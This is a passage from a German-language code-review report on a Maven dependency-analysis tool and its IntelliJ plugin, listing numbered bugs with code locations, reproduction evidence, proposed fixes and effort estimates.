- **Vorschlag:** Reactor-Version im Modell der Reactor-POM interpolieren (`model(load(p.file)).interpolate(…)`), bei verbleibendem `${` nur nach g:a vergleichen. Test in `VersionExplainerTest`/`DependencyResolverTest`. Aufwand S–M.

### 15. `type` wird ignoriert: Fix trifft bei jar + test-jar die falsche Dependency
- **Ort:** `core/.../deps/PomEditor.java:481-503` (`find` vergleicht nur g:a:classifier), `:193-201`, `:244-249`; `DependencyUsage.java:673-683` (`directEntry` lässt test-jar für jar gelten), Fixes ohne `type` in `:269-273`.
- **Szenario:** Ein Modul deklariert `lib` als `test-jar`/`test` vor `lib` (jar); der Main-Code nutzt `org.lib.Foo`. A5 meldet zwei Befunde `UNUSED`, beide mit Fix `{artifact=org.lib:lib}`. Mit Mehrfachauswahl angewendet, fallen beide Deklarationen weg, und der Main-Code baut nicht mehr. Umgekehrt ändern `setScope` und `addExclusion` den falschen Eintrag.
- **Beleg:** Selbst ausgeführt (`scratchpad/core-deps/.../Repro.java`, R7): zwei Zeilen `UNUSED org.lib:lib:1.0 … fixes={…, artifact=org.lib:lib}`, mit und ohne Resolver-Baum.
- **Vorschlag:** `type` (Standard `jar`) in `PomEditor.find`, `directEntry` und den FixActions mitführen; neuer Parameter in der FixAction-Javadoc und im Katalog-Kopf. Aufwand M.

### 16. Management-Lookup ignoriert type und classifier
- **Ort:** `core/.../deps/EffectiveModel.java:230-241` (Fallback auf irgendeinen Eintrag mit gleichem g:a). Aufgerufen in `DependencyResolver.java:121,170,177`, `ExclusionAudit.java:244,369,380`, `ModuleClasspath.java:249`, `ConflictMatrix.java:295`.
- **Szenario:**
  - Der Parent verwaltet nur `core` als `test-jar`/`test`, das Modul deklariert `core` (jar). Der Resolver liefert `com.acme:core:1.0 (test)` samt Kindern in test; Maven nimmt compile. Folge: `class-location` bestätigt bei einem Compilerfehler „liegt nur im Test-Scope“ und schlägt `set-scope compile` vor, also eine falsche Diagnose.
  - Umgekehrt (test-jar ohne Scope, jar und test-jar verwaltet) wird compile statt test angenommen.
- **Beleg:** Selbst ausgeführt (R3a/R3b): `com.acme:core:1.0 (test)` bzw. `(compile)`.
- **Vorschlag:** Lookup über den vollen Management-Schlüssel g:a:type[:classifier], wie `PomHints:85` es schon tut; der Fallback nur, wenn type/classifier unbekannt sind. Aufwand S.

### 17. Relocation wird ignoriert → Exclusion fälschlich STALE
- **Ort:** `core/.../deps/ExclusionAudit.java:226-227,303-339`, `DependencyResolver.java:150-165`. `PomFile` liest `distributionManagement/relocation` nicht.
- **Szenario:** `mysql:mysql-connector-java:8.0.33` mit Exclusion `com.google.protobuf:protobuf-java`. Die POM ist eine Relocation auf `com.mysql:mysql-connector-j`, das protobuf mitbringt. A4 meldet STALE mit Fix `remove-exclusion`; nach dem Entfernen kommt protobuf zurück. Der Resolver endet beim Relocation-Artefakt ohne Kinder und ohne Eintrag in `missing`.
- **Beleg:** Selbst ausgeführt (R1): `STALE removable=true fix=remove-exclusion`.
- **Vorschlag:** Relocation in `PomFile` lesen und in Resolver und `Closure` folgen; mindestens UNKNOWN statt STALE. Aufwand M.

### 18. Dependencies in Profilen fehlen → Exclusion fälschlich STALE
- **Ort:** `core/.../deps/ExclusionAudit.java:314` (nur `model.getDependencies()`); `PomFile` erfasst `profiles/profile/dependencies` nicht.
- **Szenario:** Die Dependency-POM bringt `jaxb-api` in einem Profil mit `activeByDefault` bzw. JDK-Aktivierung mit; das Projekt schließt es aus. A4 meldet STALE.
- **Beleg:** Selbst ausgeführt (R2): `STALE missing=[]`.
- **Vorschlag:** POMs mit Profil-Dependencies als unvollständig behandeln (UNKNOWN). Aufwand S–M.

### 19. Snapshot: unterschiedlich tief aufgelöste grüne Läufe dünnen die Referenz aus
- **Ort:** `maven-extension/.../Snapshots.java:101-106`, `core/.../snapshot/SnapshotStore.java:81-94` (`carryOver` nur bei `!isDependenciesResolved()`), `SnapshotDiff.java:300-301`.
- **Problem:** Maven löst nur die Scopes der geplanten Mojos auf. `mvn compile` kennt keine test-Dependencies, `mvn verify` schon; beide gelten als `dependenciesResolved=true`. Das verletzt die Anforderung „kurze grüne Läufe dürfen die Referenz nicht ausdünnen“.
- **Szenario:** Grün `verify`, dann grün `compile`: Die Referenz verliert junit und mockito. Ein späteres rotes `verify` ohne jede Änderung zeigt auf der Karte „Dependency neu: junit-jupiter 5.10.0, mockito-core 5.5.0“.
- **Beleg:** Selbst ausgeführt (`scratchpad/core-env/src/repro/ReproSnapshot.java`): „Referenz nach kurzem grünen compile: {org.slf4j:slf4j-api=2.0.9}“, danach die erfundenen Änderungen.
- **Vorschlag:** Scope je Dependency und die Menge der aufgelösten Scopes speichern, nur gemeinsam aufgelöste Scopes vergleichen, `carryOver` je Scope. Aufwand M.

### 20. `JarIndex` cacht Verzeichnisse nie: A3/A5 langsam, Inspection liest im Daemon
- **Ort:** `core/.../deps/JarIndex.java:128-131` (Verzeichnisse immer frisch, jede Klassendatei mit CRC). Aufrufer: `DuplicateClasses.java:309`, `DependencyUsage.java:593-595` und `:693`, im Plugin `UndeclaredDependencyInspection.java:101` → `DependencyUsage.undeclared`.
- **Problem:** Reactor-Module stehen mit `target/classes` im Classpath (`ModuleClasspath.java:322-328`). Jedes Modul liest das `target/classes` jedes Reactor-Moduls, von dem es abhängt, neu. Die Inspection tut das je passendem Import in der Read-Action des Daemons, ohne `checkCanceled`.
- **Szenario:** 200 Module, ¼ davon Reactor-Deps. „Doppelte Klassen“ und „Ungenutzt/undeklariert“ brauchen je ~5 s, fast nur Datei-I/O. Bei 30 Reactor-Deps je Modul mit je 1000 Klassen sind es hochgerechnet ≥ 20 s. Im Editor kostet jeder betroffene Import 17–48 ms warm (3000 Klassen), kalt ein Vielfaches; eine Schreibaktion muss so lange warten.
- **Beleg:** `scratchpad/core-deps/.../Bench.java`: 10.778 Verzeichnis-Lesungen, `DuplicateClasses.build` 5,2 s mit warmem JarIndex; `scratchpad/plugin-a/DirCost.java`.
- **Vorschlag:** Verzeichnis-Ergebnisse je Lauf (`Map<Path, Contents>`) bzw. an der neuesten mtime im Baum cachen; A5 braucht keine CRCs; in der Inspection Reactor-Einträge vorberechnet in der CachedValue halten. Aufwand S.

### 21. „Stop“ verwirft nur das Ergebnis; Ladeanzeige und „läuft“ hängen weiter
- **Ort:** `intellij-plugin/.../idea/ui/DetectivePanel.java:352-364` (`cancelRunning`), `:443-446`, `:460-462` (`cancel() { generation++; }`). Ohne Abbruchpunkt: `ConflictMatrixPanel.java:253,276-300`, `ExclusionsPanel.java:130,143-152`, `UpgradeSimulatorPanel.java:397,414` (`Cancellation.NONE`), `DependenciesPanel.java:197,278`, `IdeUsages.java:66-74` (`inSmartMode().executeSynchronously()` ohne `expireWhen`).
- **Problem:** `running--` und `stopOverlay()` laufen erst im Rückruf nach Ende des Workers. Rechnungen, die `c` nie prüfen, laufen also weiter.
- **Szenario:** Maven-Import löst Indizierung aus; der Nutzer klickt „Alles prüfen“ und dann „Stop“. Die Statuszeile sagt „Abgebrochen“, die Seite „Nutzung“ zeigt bis zum Ende der Indizierung (Minuten) weiter „Prüfe …“. Ein erneutes „Alles prüfen“ überspringt die Seite still (`!page.isRunning()`), bei den Exclusions bleibt Refresh gesperrt.
- **Beleg:** Code wie oben; `invokeLater(() -> { running--; … stopOverlay(); …` erst nach `work.apply(check)`.
- **Vorschlag:** Beim Abbruch sofort freigeben (Token je Lauf, damit der späte Rückruf nicht doppelt zählt); Cancellation in `ConflictMatrix.build`, `ExclusionAudit.build`, `UpgradeSimulator` (Panel) durchreichen; `IdeUsages` mit `.expireWhen(…)`. Aufwand M.

### 22. Abgewählte Häkchen kommen nach Suche, Filter oder Reimport zurück
- **Ort:** `intellij-plugin/.../idea/ui/FindingTree.java:109-110,132`; `ExclusionsPanel.java:94-96,198` (`checkedByDefault = f -> true`). Die Befunde haben kein `equals`.
- **Problem:** `known = all()` enthält nur die gerade sichtbaren Knoten. Ausgeblendete und nach einem Reload neu erzeugte Befunde bekommen wieder den Standard.
- **Szenario:** Der Nutzer hakt Exclusion E ab, weil sie bleiben soll, und entfernt die übrigen. `FixRunner` importiert neu, die Seite rechnet neu, und E ist wieder angehakt. Der nächste Klick auf „Entfernen“ löscht E mit; mit abgeschalteter Vorschau ohne Rückfrage. Dasselbe passiert, wenn man in der Suche tippt und sie wieder leert.
- **Beleg:** `n.setChecked(can && (known.contains(item) ? wasChecked.contains(item) : checkedByDefault.test(item)));`
- **Vorschlag:** Nutzerwahl als Map über einen stabilen Schlüssel (Datei + Artifact + Exclusion) halten, unabhängig von Sichtbarkeit und Reload. Aufwand S–M.

### 23. Vor einem Maven-Import gestartete Analyse gilt danach als aktuell
- **Ort:** `intellij-plugin/.../idea/AnalysisResults.java:124-131` (bei RUNNING nur `before` auf STALE), `DependencyUsagePanel.java:114-118,157-162`, analog `DuplicateClassesPanel.java:120-124,163-168`, `UpgradeSimulatorPanel.java:550`.
- **Problem:** `mavenImported` setzt `setStale(true)` nur bei `result != null`; das Ergebnis des laufenden Durchgangs (Bäume vom Start) setzt danach `setStale(false)` und `DONE`.
- **Szenario:** „Nutzung prüfen“ läuft (wartet ohnehin auf Smart Mode), der Nutzer fügt im Editor Dependency X hinzu, Auto-Reload importiert. Das Ergebnis meldet X als „undeklariert“, ohne Balken „veraltet“; „Beheben“ will X ein zweites Mal deklarieren.
- **Beleg:** Code wie oben; das Zeitfenster habe ich nicht in `runIde` nachgestellt.
- **Vorschlag:** Importzähler in `AnalysisResults`, beim Start merken und im `done` vergleichen. Aufwand S.

### 24. Lade-/„läuft“-Zustände bleiben nach Fehler, `null` oder Abbruch stehen
- **Ort:**
  - (a) `BuildDoctorPanel.java:302-309` + `SetupComparisonView.java:57,83-88`
  - (b) `BuildDoctorPanel.java:333-341` + `PreflightView.java:117-123`
  - (c) `OverviewPanel.java:150-151,271-277,319-326`
  - (d) `UpgradeSimulatorPanel.java:397-404` + `UpgradeResultEditor.java:182,253-255`
- **Szenario:**
  - (a) `compareSetups` gibt bei einer Ausnahme `null` zurück; die Tabelle zeigt dauerhaft „Vergleiche IDE und Kommandozeile …“.
  - (b) Wirft der Preflight, steht „Prüfe …“ für immer.
  - (c) „Alles prüfen“ → Stop: die Setup-Kachel dreht sich weiter.
  - (d) Wirft die Simulation, bleiben „Übernehmen“ und „Erneut simulieren“ im Editor-Tab grau.
- **Beleg:** `aborted()`/`failed()` sind in diesen Seiten nicht überschrieben.
- **Vorschlag:** `aborted()`/`failed()` überschreiben, Views zurücksetzen bzw. `fireResult()`/`showSetup()` aufrufen; für `null` einen eigenen Leertext. Aufwand S.

### 25. `PomInsights.matrix()`: ein verworfenes Ergebnis wird nie neu angestoßen
- **Ort:** `intellij-plugin/.../idea/PomInsights.java:130-153` (`finally computing=false`, Generation-Check bei 147), `invalidate` (`:104-111`, kein Daemon-Restart).
- **Szenario:** pom.xml zweimal kurz hintereinander speichern, oder der Maven-Import endet, während die erste Matrix noch rechnet. Das Ergebnis wird verworfen, eine neue Rechnung oder ein `DaemonCodeAnalyzer.restart` folgt nicht. Ein Highlighting-Lauf im Fenster hat Facts mit leeren `conflicts` gecacht. Code Vision „3 Module · 2 Versionen“ verschwindet, bis der Nutzer wieder tippt.
- **Beleg:** Code gelesen (Race, nicht in `runIde` nachgestellt).
- **Vorschlag:** Bei Generationswechsel neu rechnen (Schleife) bzw. `changed()` auslösen; `invalidate()` startet den Daemon neu. Aufwand S.

### 26. Benachrichtigungen setzen Diagnose- und Fehlertexte ungeescaped als HTML ein
- **Ort:** `intellij-plugin/.../idea/BuildDoctorService.java:358-363` (`d.getCause()`), `:230-232`; `FixRunner.java:94,137` (`e.getMessage()`).
- **Szenario:** Die Ursache `settings.xml has no <server> with the ID 'nexus'` (`texts.properties:63`) erscheint in der Sprechblase als „settings.xml has no  with the ID 'nexus'“, weil `<server>` als Tag gilt.
- **Beleg:** `createNotification(…, d.getCause(), …)`; `FixRunner.apply` escapet an anderer Stelle bewusst.
- **Vorschlag:** `Html.esc` bzw. `StringUtil.escapeXmlEntities` vor `createNotification`. Aufwand S.

### 27. Konsolen-Link „BUILD FAILURE“ zeigt die neueste Diagnose, nicht die dieser Konsole
- **Ort:** `intellij-plugin/.../idea/BuildFailureConsoleFilter.java:68` (`BuildDoctorPanel::showLatest`).
- **Szenario:** Lauf A scheitert, danach scheitert Lauf B oder ein Log aus der Zwischenablage wird analysiert. Der Klick in der Konsole von A zeigt die Diagnose von B.
- **Beleg:** `HyperlinkInfo open = p -> Navigator.buildDoctor(p, BuildDoctorPanel::showLatest);`
- **Vorschlag:** Lauf über Konsole bzw. ExecutionEnvironment zuordnen und gezielt den Verlaufseintrag zeigen. Aufwand M.

### 28. Nach jedem POM-Fix ein voller, erzwungener Sync aller Maven-Projekte
- **Ort:** `intellij-plugin/.../idea/IdeMaven.java:458-466`, aufgerufen aus `FixRunner.java:423`.
- **Szenario:** Eine Exclusion in einem Reactor mit 300 Modulen löst `forceUpdateAllProjectsOrFindAllAvailablePomFiles()` aus, also `MavenSyncSpec.full` über alle Module (Minuten). Danach sind alle Analysen „veraltet“.
- **Beleg:** Code + Bytecode der Plattform.
- **Vorschlag:** Nur die betroffenen Projekte aktualisieren (`forceUpdateProjects(…)` bzw. inkrementeller Sync). Aufwand S.

### 29. Editor-Caches hängen am globalen VFS-Zähler; jede Neuberechnung scannt den Reactor
- **Ort:** `intellij-plugin/.../idea/PomInsights.java:162-165`, `StaleExclusionInspection.java:58-59` (Abhängigkeit `VirtualFileManager.getInstance()`); dazu je ein neuer `PomLocator` → `PomLocator.byCoordinates` (`:154`) → `ProjectPoms.all()` (`:113-121`) mit DOM-Parse jeder Modul-POM, ohne `PomCache`.
- **Szenario:** Jede gespeicherte Datei, auch Build-Output, macht Facts und Exclusion-Audit ungültig. Der nächste Highlighting-Lauf der offenen pom.xml rechnet im Daemon neu: Reactor-Scan 30–170 ms bei 316 Modulen je Verbraucher, plus ExclusionAudit.
- **Beleg:** `scratchpad/plugin-a/ScanCost.java`.
- **Vorschlag:** Abhängigkeiten nur eigener Tracker + POM-Event + Import-Zähler; `ProjectPoms` je Projekt cachen bzw. an `PomCache` hängen. Aufwand M.

### 30. Statische Caches mehrfach vorhanden und nie geleert
- **Ort:** `core/.../check/ClasspathChecks.java:46` und `intellij-plugin/.../IdeUsages.java:46` (je ein `JarIndex`, bis 5000 Einträge); `PomInsights.java:53`, `StaleExclusionInspection.java:44`, `UndeclaredDependencyInspection.java:55` (je ein `PomCache`, bis 20.000 Einträge). `searchRepository` (`ClasspathChecks.java:232`) liest bis zu 600 JARs, die in keinem Classpath liegen, in den Cache.
- **Szenario:** In der IDE liegen dieselben JARs doppelt und dieselben POMs dreifach im Speicher. Weder Projekt-Schließen noch `LowMemoryWatcher` leert sie.
- **Beleg:** 590 JARs × 1000 Klassen = 52 MB (`Bench3.java`); 1165 JARs / 287k Klassen ≈ 30 MB je Index (`JarMem.java`).
- **Vorschlag:** Je ein gemeinsamer Cache, Grenze nach Klassenzahl, geleert über `LowMemoryWatcher.register(…, parentDisposable)` und beim Projekt-Schließen; Repository-Suche mit lokalem, kurzlebigem Index. Aufwand S.

### 31. `MavenVersion` weicht von `ComparableVersion` ab
- **Ort:** `core/.../deps/MavenVersion.java:61-90` (keine Unterlisten bei `-`, Nullen nur am Ende gekürzt), `:100` (Kürzung auf 18 Stellen), `:110-118` (`a`/`b`/`m` immer Qualifier).
- **Szenario:** `ConflictMatrix.java:181` fasst über `TreeMap(ORDER)` „gleiche“, aber verschiedene Versionen zusammen, während `isDivergent` Strings zählt, die Anzeige wird inkonsistent. `UpgradeSimulator:599` kann ein Upgrade als Downgrade werten.
- **Beleg:** Selbst gegen `maven-artifact-3.9.11` laufen lassen (`scratchpad/core-pom/.../VersionCmp.java`), 13 von 58 Paaren weichen ab, u. a.:

  | Paar | Maven | Tool |
  |---|---|---|
  | `1.0-1` vs `1.0.1` | -1 | 0 |
  | `1.0.0-rc1` vs `1.0-rc1` | 0 | 1 |
  | `2.0.0-M1` vs `2.0-M1` | 0 | 1 |
  | `1.0-a` vs `1.0` | 1 | -1 |
  | `2.13.4.2` vs `2.13.4-2` | 1 | 0 |
  | `1.2.3-b` vs `1.2.3-beta` | 1 | 0 |
  | 20-stellige Zahlen | ≠ | 0 |
- **Vorschlag:** Algorithmus von `ComparableVersion` nachbauen (ListItem bei `-`, Normalisierung je Teilliste, `BigInteger`); die Paare als Testtabelle in `MavenVersionTest`. Aufwand M.

### 32. Deklaration mit `${project.groupId}`: POM-Fixes finden die Dependency nicht
- **Ort:** `core/.../deps/PomEditor.java:147,194,245,366,487` (roher Textvergleich).
- **Szenario:** Reactor-Geschwister mit `<groupId>${project.groupId}</groupId>`. A5, A6 und `add-exclusion` übergeben die interpolierte GA; `removeDependency`/`setScope("com.acme","a")` melden „Dependency com.acme:a unter dependencies nicht gefunden“, und der angebotene Fix scheitert.
- **Beleg:** `scratchpad/core-pom/.../EditorCases.java` (Ausgabe in `editor-cases.txt`).
- **Vorschlag:** Dem Editor einen Interpolator (Properties der Kette) mitgeben bzw. Kandidaten mit `${` über das Modell auflösen. Aufwand M.

### 33. Doppelt definierte Property: das Tool nimmt die erste, Maven die letzte
- **Ort:** `core/.../deps/PomFile.java:289`, `PomEditor.java:783-784`.
- **Szenario:** `<v>1</v><v>2</v>` in `<properties>`. Maven nimmt 2, „Warum diese Version?“ erklärt 1. `setProperty(v,3)` ändert die erste Definition und bleibt damit wirkungslos.
- **Beleg:** `MavenXpp3Reader` liefert `v=2`, `PomFile` liefert 1 (`EditorCases.java`).
- **Vorschlag:** Die letzte gewinnen lassen, beim Lesen wie im Editor. Aufwand S.

### 34. POM mit UTF-8-BOM: Upgrade-Simulation scheitert
- **Ort:** `core/.../deps/PomFile.java:151-159` (`parse(path, xml)` über `StringReader`), Aufrufer `UpgradeSimulator.java:522`, `PomLocator.withOverrides`.
- **Szenario:** POM beginnt mit BOM. A6 meldet „… wäre nach der Änderung kein gültiges XML: Content ist nicht zulässig in Prolog“, obwohl `PomFile.read` und Maven dieselbe Datei lesen.
- **Beleg:** `scratchpad/core-pom/.../Repro2.java`.
- **Vorschlag:** Führendes `\uFEFF` in `parse` entfernen. Aufwand S.

### 35. Selbstbezügliche Property sprengt den Speicher
- **Ort:** `core/.../deps/EffectiveModel.java:299-322`.
- **Szenario:** `<x>${x}${x}${x}${x}${x}${x}</x>` endet nach 7,8 s mit `OutOfMemoryError` (1 GB Heap), weil die Länge mit 6^10 wächst. Im Plugin passiert das im Hintergrund oder im Daemon. Der einfache Zyklus `a→b→a` liefert `value="${a}"` mit `isResolved()==true`.
- **Beleg:** `scratchpad/core-pom/.../ModelCases.java`. Maven selbst lehnt solche POMs ab, deshalb nur Mittel.
- **Vorschlag:** `visiting`-Set bzw. Auflösungsstapel, Zyklus als unaufgelöst melden, Längengrenze. Aufwand S.

### 36. `set-jvm-option` fügt `.mvn/jvm.config` zu einer Zeile zusammen
- **Ort:** `core/.../fix/FixExecutor.java:80-92`.
- **Szenario:** Aus `# Speicher für große Builds\n-Xmx1g\n-Dfile.encoding=UTF-8` wird `# Speicher für große Builds -Dfile.encoding=UTF-8 -Xmx2g`. Entfernt Maven `#`-Kommentare zeilenweise, sind alle Optionen weg, auch die neue; sonst landet `#` als JVM-Argument im Aufruf.
- **Beleg:** `scratchpad/core-log/Repro.java jvmconfig`.
- **Vorschlag:** Zeilenbasiert: Option in ihrer Zeile ersetzen bzw. als eigene Zeile anhängen, Kommentare erhalten. Aufwand S.

### 37. Pfade mit Leerzeichen werden abgeschnitten
- **Ort:** `core/.../check/RuntimeChecks.java:86`, `RepositoryChecks.java:155`, `PomChecks.java:34`, Katalog `:92,96,115,151,155`.
- **Szenario:** Projekt unter `C:\Users\Max Mustermann\…` oder `OneDrive - Firma`:
  - Compilerfehler: `open-file` springt auf `mustermann/proj/src/main/java/A.java`.
  - Kaputtes JAR: geprüft wird `/.m2/repository/…`, die Diagnose sagt „existiert nicht mehr“, statt das Löschen anzubieten.
  - `Child module … does not exist` ergibt `unknown`.
- **Beleg:** `scratchpad/core-log/SpacePaths.java`.
- **Vorschlag:** An Literalen verankern, z. B. `error reading (?<file>.+?\.jar)`, `^(.+?\.(?:java|kt|groovy)):\[`, `@ (.+?\.xml), line`. Testlog mit Leerzeichen-Pfad. Aufwand S.

### 38. Ausnahmen in Zeilen ohne Präfix führen zu Diagnosen bei erfolgreichen Builds
- **Ort:** `core/.../io/MavenLogParser.java:84-86,91-97`.
- **Szenario:** Eine Anwendungs-Logzeile `WARN … falling back: java.lang.NoClassDefFoundError: org/optional/Feature` aus einem bestandenen Test, danach `BUILD SUCCESS`: `diagnose` gibt die Karte „#10 Laufzeitkonflikt in Tests“ aus. In einem roten Mehrmodul-Lauf schlägt diese Regel (Priorität 60) eine echte `artifact-not-resolvable` (50).
- **Beleg:** `scratchpad/core-log/success.log`.
- **Vorschlag:** Solche Zeilen nur in Surefire-Fehlerblöcken bzw. bei `BUILD FAILURE` werten oder als schwächere Belege führen. Aufwand S.

### 39. Maven- und Java-Version werden nur ohne Zeilenpräfix gelesen
- **Ort:** `core/.../io/MavenLogParser.java:26-28,135-152` (`^Apache Maven`, `^Java version`).
- **Szenario:** CI-Logs mit Zeitstempel und `mvn -V` (GitHub Actions, Jenkins): Maven- und Java-Version bleiben leer. `jdk-version` kann nicht bestätigen, die Ursache bleibt allgemein („JDK einer älteren Version“).
- **Beleg:** `FormatCheck.java` (selbst ausgeführt): `maven=null java=null` bei jedem Präfix.
- **Vorschlag:** Session-Hinweise auf den Text nach dem Präfix anwenden; zusammen mit #8. Aufwand S.

### 40. Ungenutzte `logLines` belegen Speicher
- **Ort:** `core/.../io/MavenLogParser.java:40,60-62`, `BuildFailure.getLogLines`.
- **Problem:** Gespeichert werden die ersten 20.000 Zeilen, also der Anfang des Logs; gelesen werden sie nirgends.
- **Szenario:** Das Plugin hält im Verlauf 20 `Result`s mit `failure`.
- **Beleg:** `scratchpad/core-log/Retained.java`: 20 Läufe halten 60 MB Heap.
- **Vorschlag:** Entfernen oder durch einen Ringpuffer der letzten N Zeilen ersetzen. Aufwand S.

### 41. Exclusion im Parent wird nur im Kontext des Parents geprüft
- **Ort:** `core/.../deps/ExclusionAudit.java:175` (`consumer = locator.model(pom)` der deklarierenden POM).
- **Szenario:** Der Parent vererbt `org.d:d:1.0` mit Exclusion `org.x:x`. Das Kind verwaltet `org.m:m` auf 2.0, und `m:2.0` bringt x mit. Der Parent meldet STALE; nach dem Fix enthält der Baum des Kindes `org.x:x:1.0`.
- **Beleg:** `scratchpad/core-deps/.../Repro2.java` (R9), Fix im Speicher über `withOverrides` angewendet.
- **Vorschlag:** Geerbte Exclusions im Kontext jedes erbenden Moduls prüfen; STALE nur, wenn überall STALE. Aufwand M.

### 42. Exclusions aus dem dependencyManagement der Dependency-POM fehlen
- **Ort:** `core/.../deps/DependencyResolver.java:182-183` (`own.dep.getExclusionEntries()` ungenutzt), `ExclusionAudit.Closure:333-337`.
- **Szenario:** Parents im Stil von hadoop-project verwalten Exclusions, Mavens Model-Builder injiziert sie. Der Resolver nimmt `org.x:x:1.0 (compile)` in den Baum, Maven lässt es weg. Folgen: falsche doppelte Klassen, falsche Deltas in A6, falsche UNDECLARED-Meldungen.
- **Beleg:** Selbst ausgeführt (R4): `org.l:l → org.m:m → org.x:x:1.0 (compile)`.
- **Vorschlag:** Hat `dep` keine eigenen Exclusions, die verwalteten einmischen. Aufwand S.

### 43. Classpath ohne Baum (`fromPoms`) weicht von Maven ab und ist doppelt so langsam
- **Ort:** `core/.../deps/ModuleClasspath.java:245` (type=pom übersprungen), `:268-280` (Closure je direkter Dep, Verlierer-Teilbäume zählen mit), `:297-303` (Schlüssel nur g:a).
- **Szenario:** Classpath `[d1, y:1.0, x:2.0]`; Maven hat y nicht (hängt am Verlierer x:1.0), aber z (über die Dep vom Typ pom). test-jar und jar fallen zu einem Eintrag zusammen. Der `DependencyResolver` liegt in beiden Fällen richtig.
- **Beleg:** R6 selbst ausgeführt; `DuplicateClasses.build` ohne Bäume 10,9 s statt 5,2 s.
- **Vorschlag:** Ohne Baum `DependencyResolver.resolve` nutzen (wie `ClassOrigin`) und `fromPoms` streichen. Aufwand S–M.

### 44. A5: Klasse in mehreren JARs → deklarierte Dependency sicher UNUSED
- **Ort:** `core/.../deps/DependencyUsage.java:640-655` (erster compile-Eintrag gewinnt).
- **Szenario:** Ein Starter bringt `impl` mit, das `jakarta.servlet.Servlet` enthält; zusätzlich ist `jakarta.servlet-api` (provided) deklariert, der Code importiert Servlet. Ergebnis: `UNUSED jakarta.servlet-api certain=true fix=remove-dependency`, und `UNDECLARED impl` wird als Starter ausgeblendet.
- **Beleg:** Selbst ausgeführt (R8).
- **Vorschlag:** Liefert auch ein deklarierter direkter Eintrag die Klasse, diesem zurechnen. Aufwand S.

### 45. Lineare Suchen dominieren Resolver, Matrix und Simulator
- **Ort:** `core/.../deps/EffectiveModel.java:230-241` (Fehltreffer läuft über alle verwalteten Einträge), `PomLocator.java:154-161` (`byCoordinates` über den ganzen Reactor). Aufrufer: `DependencyResolver:170,177`, `ConflictMatrix:312,357`, `ExclusionAudit.Closure:369`.
- **Beleg:** `managed()` Treffer 128 ns, Fehltreffer 4126 ns (1500 Einträge); `byCoordinates` 6,6 µs bei 201 POMs. JFR: ~80 % der CPU-Samples von Resolver, Matrix und Simulator in `managed`.
- **Vorschlag:** Index g:a → Managed je Modell, Map GAV → Pom im Locator. Aufwand S.

### 46. A6 rechnet alles zweimal mit kaltem Locator, hält ~98 MB und ist nicht abbrechbar
- **Ort:** `core/.../deps/UpgradeSimulator.java:507-510,537-551` (`withOverrides` mit leerem Cache), `ModuleResult` hält Bäume vorher/nachher; `intellij-plugin/.../UpgradeSimulatorPanel.java:414` (`Cancellation.NONE`).
- **Beleg:** `simulate` 5,2 s bei 201 Modulen (eine Auflösung 3,0 s), Ergebnis hält ~98 MB.
- **Vorschlag:** Unveränderte `PomFile`s wiederverwenden; nur Module neu auflösen, deren Kette eine geänderte Datei enthält; Bäume nach dem Diff abwerfen; Cancellation durchreichen. Aufwand M.

### 47. Maven Wrapper 3.3.x wird nicht gefunden
- **Ort:** `core/.../env/BuildSetup.java:190`.
- **Problem:** Gesucht wird nur `dists/apache-maven-X-bin/<hash>/…`; der aktuelle mvnw (only-script, Standard von `mvn wrapper:wrapper`) entpackt nach `dists/apache-maven-X/<hash>/`.
- **Szenario:** `mavenHome` bleibt `null`; die globale `conf/settings.xml` (Mirrors, Proxies) fehlt im CLI-Preflight und im IDE-gegen-CLI-Vergleich.
- **Beleg:** `ReproWrapper.java`: `mavenHome=null`.
- **Vorschlag:** Beide Verzeichnisnamen prüfen. Aufwand S.

### 48. Events-JSONL ohne Synchronisation
- **Ort:** `maven-extension/.../DetectiveEventSpy.java:278-290` (`write(json)`, `write('\n')`, `flush` getrennt, `writer = null` als Data Race), `:124` (`repositoryEvents++` nicht atomar).
- **Szenario:** Zwei Module scheitern unter `-T 4` gleichzeitig, oder Metadaten-Fehler kommen aus Resolver-Threads. Zeilen vermischen sich, `EventLog.read` verwirft sie still, und beide `mojoFailed` fehlen für CLI/CI. Die Karte im Log ist nicht betroffen, weil sie aus der synchronisierten Liste kommt. Nebenbei: Bei `IOException` bleibt der Writer offen.
- **Beleg:** Nachbildung von `record()` mit 4 Threads × 2000 Events: 1149 von 8000 Zeilen unlesbar (selbst ausgeführt). Ob Mavens `EventSpyDispatcher` wirklich parallel aufruft, ist nicht gemessen, deshalb plausibel.
- **Vorschlag:** `record` synchronisieren oder `json + "\n"` in einem Aufruf schreiben; `AtomicInteger`; Writer bei Fehler schließen. Aufwand S.

### 49. HEAD-Probe kann über den IDE-Authenticator Zugangsdaten senden
- **Ort:** `core/.../preflight/RepositoryProbe.java:59-66`.
- **Problem:** `HttpURLConnection` fragt bei 401/407 `Authenticator.getDefault()`; in IntelliJ ist das `IdeaWideAuthenticator`, der gemerkte Zugangsdaten liefern oder einen Dialog zeigen kann. Das widerspricht „nie Zugangsdaten senden“.
- **Szenario:** Preflight mit Netz in der IDE gegen einen Nexus, der 401 liefert.
- **Beleg:** Code; das Verhalten des IDE-Authenticators habe ich nicht in `runIde` geprüft.
- **Vorschlag:** Ab Java 9 per Reflection `setAuthenticator(…)` mit einem Authenticator, der `null` liefert (Kern bleibt Java-8-Bytecode). Aufwand S.

### 50. Log-Navigator baut große Logs komplett auf dem EDT
- **Ort:** `intellij-plugin/.../idea/LogNavigatorView.java:134-139,146-160,162-211`; Zwischenablage ohne Grenze in `BuildDoctorActions.java:52-57`.
- **Szenario:** 8 Mio. Zeichen (78k Zeilen): `clean` 12–83 ms plus `LogOutline.of` 84–163 ms plus Dokument, Editor, 7,8k Highlighter und Fold-Regionen, alles auf dem EDT. Ein 50-MB-CI-Log aus der Zwischenablage friert die IDE geschätzt 1–2 s ein.
- **Beleg:** `scratchpad/plugin-a/LogCost.java` (nur Kernteil gemessen).
- **Vorschlag:** `clean` und `LogOutline` über `background`, auf dem EDT nur Editor und Markup; Zwischenablage kappen. Aufwand S–M.

### 51. Verlauf hält bis zu 20 `ExecutionEnvironment`s und Rohlogs
- **Ort:** `intellij-plugin/.../idea/BuildDoctorService.java:59-61,116,129`; `MavenRunListener.java:39,47,110-115`.
- **Problem:** `ExecutionEnvironment` hält den `RunContentDescriptor` (Konsole, ProcessHandler) und einen `DataContext`. Nach dem ersten Kürzen enthält das Log `CUT_MARKER` mit „…“ (kein Latin-1), der String wird UTF-16, also doppelt so groß. Logs aus der Zwischenablage haben keine Grenze.
- **Szenario:** 20 große rote Läufe ≈ 320 MB Rohlog plus geschlossene Konsolen, freigegeben erst beim Schließen des Projekts.
